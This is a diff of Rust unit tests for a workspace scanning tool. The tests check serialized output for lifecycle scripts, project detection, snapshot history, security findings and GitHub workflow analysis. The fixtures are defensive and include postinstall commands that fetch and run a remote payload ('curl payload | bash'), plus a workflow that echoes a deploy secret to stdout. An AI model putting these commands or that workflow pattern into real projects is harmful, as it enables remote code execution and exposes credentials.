+            "expectedInventoryFingerprint": "fingerprint-1"
+        }))
+        .unwrap();
+        assert_eq!(accept_options.root.as_deref(), Some("/workspace"));
+        assert_eq!(accept_options.ecosystems, vec![EcosystemDto::Node]);
+        assert_eq!(
+            accept_options.expected_inventory_fingerprint,
+            "fingerprint-1"
+        );
     }
 
     #[test]
@@ -955,6 +1769,7 @@ mod tests {
     fn lifecycle_script_wire_values_are_stable() {
         let response = LifecycleScriptDto {
             package: "demo".to_string(),
+            manifest_path: "/workspace/package.json".to_string(),
             package_manager: PackageManagerDto::Pnpm,
             script_type: ScriptTypeDto::PrepublishOnly,
             command: "node publish.js".to_string(),
@@ -965,6 +1780,7 @@ mod tests {
             serde_json::to_value(response).unwrap(),
             json!({
                 "package": "demo",
+                "manifestPath": "/workspace/package.json",
                 "packageManager": "pnpm",
                 "scriptType": "prepublishOnly",
                 "command": "node publish.js",
@@ -977,6 +1793,7 @@ mod tests {
     fn critical_lifecycle_risk_is_preserved_in_wire_contract() {
         let response = LifecycleScriptDto {
             package: "demo".to_string(),
+            manifest_path: "/workspace/package.json".to_string(),
             package_manager: PackageManagerDto::Npm,
             script_type: ScriptTypeDto::Postinstall,
             command: "curl payload && ./payload".to_string(),
@@ -987,6 +1804,7 @@ mod tests {
             serde_json::to_value(response).unwrap(),
             json!({
                 "package": "demo",
+                "manifestPath": "/workspace/package.json",
                 "packageManager": "npm",
                 "scriptType": "postinstall",
                 "command": "curl payload && ./payload",
@@ -1071,6 +1889,7 @@ mod tests {
                     technology: None,
                 },
             }],
+            projects: Vec::new(),
             history_warning: None,
             artifact_snapshot: None,
             artifact_snapshot_warning: None,
@@ -1106,6 +1925,40 @@ mod tests {
                 "deletedPaths": ["/workspace/target"],
                 "failedPaths": []
             })
+        );
+    }
+
+    #[test]
+    fn scan_response_exposes_detection_only_projects() {
+        let response = ScanResponse {
+            artifacts: Vec::new(),
+            projects: vec![ProjectIdentityDto {
+                root: "/workspace/go".to_owned(),
+                display_name: "go".to_owned(),
+                ecosystem: EcosystemDto::Go,
+                technology: Some(ProjectTechnologyDto {
+                    languages: vec!["Go".to_owned()],
+                    runtime: None,
+                    build_system: None,
+                    display_label: "Go".to_owned(),
+                    evidence: vec![TechnologyEvidenceDto {
+                        path: "go.mod".to_owned(),
+                        detail: "Go project metadata".to_owned(),
+                    }],
+                }),
+            }],
+            history_warning: None,
+            artifact_snapshot: None,
+            artifact_snapshot_warning: None,
+        };
+
+        let value = serde_json::to_value(response).unwrap();
+
+        assert_eq!(value["projects"][0]["ecosystem"], "Go");
+        assert_eq!(value["projects"][0]["technology"]["displayLabel"], "Go");
+        assert_eq!(
+            value["projects"][0]["technology"]["evidence"][0]["path"],
+            "go.mod"
         );
     }
 
@@ -1148,6 +2001,37 @@ mod tests {
     }
 
     #[test]
+    fn artifact_snapshot_history_wire_format_exposes_retention_metadata() {
+        let result = ArtifactSnapshotResult {
+            status: ArtifactSnapshotStatus::BaselineCreated,
+            snapshot: ArtifactSnapshot {
+                workspace_id: "/workspace".to_owned(),
+                timestamp: ArtifactSnapshot::from_analysis(
+                    Path::new("/workspace"),
+                    &AnalysisResult::default(),
+                )
+                .timestamp,
+                artifacts: Vec::new(),
+            },
+            previous_snapshot: None,
+            changes: Vec::new(),
+        };
+
+        let value = serde_json::to_value(artifact_snapshot_history_to_dto(vec![result])).unwrap();
+
+        assert_eq!(value["entries"].as_array().unwrap().len(), 1);
+        assert_eq!(value["retainedSnapshotCount"], 1);
+        assert_eq!(
+            value["retentionLimit"],
+            MAX_ARTIFACT_SNAPSHOTS_PER_WORKSPACE
+        );
+        assert_eq!(
+            serde_json::to_value(ArtifactSnapshotStatus::ComparisonUnavailable).unwrap(),
+            "comparisonUnavailable"
+        );
+    }
+
+    #[test]
     fn security_scan_wire_format_preserves_structured_findings() {
         let report = SecurityReport {
             findings: vec![SecurityFinding::new(
@@ -1158,12 +2042,28 @@ mod tests {
                 Some("curl payload | bash".to_owned()),
                 "Remote script is piped to a shell.",
             )],
+            lifecycle_warnings: vec![SecurityWarning {
+                package: "demo".to_owned(),
+                script_type: "postinstall".to_owned(),
+                command: "curl payload | bash".to_owned(),
+                risk_level: RiskLevel::High,
+                reason: "Remote script is piped to a shell.".to_owned(),
+            }],
+            lifecycle_scripts: vec![LifecycleScript {
+                package: "demo".to_owned(),
+                manifest_path: "/workspace/node_modules/demo/package.json".into(),
+                package_manager: PackageManager::Npm,
+                script_type: ScriptType::Postinstall,
+                command: "curl payload | bash".to_owned(),
+                risk_level: RiskLevel::High,
+            }],
             ..SecurityReport::default()
         };
         let response: SecurityScanResponse = report.into();
+        let wire = serde_json::to_value(response).unwrap();
 
         assert_eq!(
-            serde_json::to_value(response).unwrap()["findings"][0],
+            wire["findings"][0],
             json!({
                 "path": "/workspace/package.json",
                 "rule": "suspicious-script",
@@ -1173,12 +2073,61 @@ mod tests {
                 "reason": "Remote script is piped to a shell."
             })
         );
+        assert_eq!(
+            wire["lifecycleWarnings"][0]["reason"],
+            "Remote script is piped to a shell."
+        );
+        assert_eq!(
+            wire["lifecycleScripts"][0]["manifestPath"],
+            "/workspace/node_modules/demo/package.json"
+        );
+    }
+
+    #[test]
+    fn workflow_scan_wire_format_is_structured_and_secret_safe() {
+        let temp_dir = TempDir::new().unwrap();
+        let workflow_dir = temp_dir.path().join(".github/workflows");
+        std::fs::create_dir_all(&workflow_dir).unwrap();
+        std::fs::write(
+            workflow_dir.join("security.yml"),
+            r#"name: Security
+permissions: write-all
+jobs:
+  build:
+    name: Build
+    steps:
+      - name: Upload token
+        run: echo "${{ secrets.DEPLOY_TOKEN }}"
+"#,
+        )
+        .unwrap();
+
+        let report = dustfril_core::api::workflow_scan(temp_dir.path()).unwrap();
+        let response: WorkflowScanResponse = report.into();
+        let value = serde_json::to_value(response).unwrap();
+
+        assert_eq!(value["workflows"][0]["analysisStatus"], "analyzed");
+        assert_eq!(value["workflows"][0]["jobs"][0]["id"], "build");
+        assert_eq!(value["workflows"][0]["jobs"][0]["stepCount"], 1);
+        let secret_finding = value["findings"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .find(|finding| finding["category"] == "secretExposure")
+            .unwrap();
+        assert_eq!(secret_finding["secretReference"], "DEPLOY_TOKEN");
+        assert_eq!(secret_finding["exposureSink"], "stdout");
+        assert_eq!(secret_finding["evidence"], "supported stdout sink");
+        let serialized = value.to_string();
+        assert!(!serialized.contains("${{"));
+        assert!(!serialized.contains("actual-secret-value"));
     }
 
     #[test]
     fn history_warning_is_additive_and_omitted_for_healthy_operations() {
         let scan = ScanResponse {
             artifacts: Vec::new(),
+            projects: Vec::new(),
             history_warning: None,
             artifact_snapshot: None,
             artifact_snapshot_warning: None,
